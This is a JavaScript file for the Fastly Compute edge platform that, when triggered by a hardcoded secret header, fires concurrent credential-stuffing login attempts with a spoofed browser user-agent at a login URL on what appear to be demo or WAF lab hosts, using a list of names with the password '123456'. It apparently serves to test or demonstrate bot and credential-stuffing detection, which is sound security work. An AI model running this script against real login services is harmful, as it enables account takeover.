/// <reference types="@fastly/js-compute" />

addEventListener("fetch", (event) => event.respondWith(handleRequest(event)));

// const usernames_passwords = [
//   { name: 'Name1', password: 'randomguid1' },
//   { name: 'Name2', password: 'randomguid2' },
//   many more entries
// ];

const usernames_passwords = [{ name: "Amity", password: "123456" }, { name: "Eagan", password: "123456" }, { name: "Dillon", password: "123456" }, { name: "Grady", password: "123456" }, { name: "Rhiannon", password: "123456" }, { name: "Erasmus", password: "123456" }, { name: "Sasha", password: "123456" }, { name: "Kyle", password: "123456" }, { name: "Sybil", password: "123456" }, { name: "Isabelle", password: "123456" }, { name: "Porter", password: "123456" }, { name: "Leigh", password: "123456" }, { name: "Richard", password: "123456" }, { name: "Winter", password: "123456" }, { name: "Channing", password: "123456" }, { name: "Desirae", password: "123456" }, { name: "Hayley", password: "123456" }, { name: "Leo", password: "123456" }, { name: "Xavier", password: "123456" }, { name: "Grady", password: "123456" }, { name: "Deacon", password: "123456" }, { name: "Addison", password: "123456" }, { name: "Sonya", password: "123456" }, { name: "Erica", password: "123456" }, { name: "Kirk", password: "123456" }, { name: "Aurora", password: "123456" }, { name: "Aimee", password: "123456" }, { name: "Dana", password: "123456" }, { name: "Simon", password: "123456" }, { name: "Hiroko", password: "123456" }, { name: "Jeanette", password: "123456" }];

async function handleRequest(event) {

  let req = event.request;

  if (req.headers.get("secret-key") == "mysecret"){
    console.log(`doing cred stuffing`);
    await doCredentialStuffing();
  };
  return new Response("OK", { status: 200 });
}

// Helper function to generate a random integer, either 0 or 1
function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

async function doCredentialStuffing(){
    // Iterate over each username and send a POST request
    const fetchPromises = usernames_passwords.map(async usernames_password => {
      // Generate a random number (200 or 401)
      const number = getRandomInt(10) === 0 ? 200 : 401;
  
      // Construct the JSON body
      // const jsonBody = JSON.stringify({
      //   username: usernames_password.name,
      //   password: usernames_password.password,
      // });
  
      // Send the HTTP POST request
      // const url = 'https://http-me.edgecompute.app/anything/login';
      // const url = 'https://bcunning-ngwaf-lab.global.ssl.fastly.net/anything/login';

      // Create the form data
      const formData = new URLSearchParams();
      formData.append('username',  usernames_password.name);
      formData.append('password', usernames_password.password);

      const url = 'https://dev-tf-demo.global.ssl.fastly.net/anything/login';
      const reqHeaders = {
        // 'Content-Type': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'endpoint': `status=${number}`
      };
  
      // Perform the POST request and check the response
      const response = fetch(url, {
        method: 'POST',
        headers: reqHeaders,
        // body: jsonBody,
        body: formData,
        backend: 'credstuffingtarget',
      });
  
      return response
    });
  
    // Wait for all fetch requests to complete
    const responses = await Promise.all(fetchPromises);
  
    // Check the response codes and log the responses for those that are 200
    responses.forEach(async response => {
      if (response.status === 200) {
        const responseBody = await response.json(); // assuming the server returns JSON
        console.log('Login_success:', responseBody.body);
      }
      if (response.status === 401) {
        const responseBody = await response.json(); // assuming the server returns JSON
        // console.log('Login_failure:', responseBody);
      }
    });

}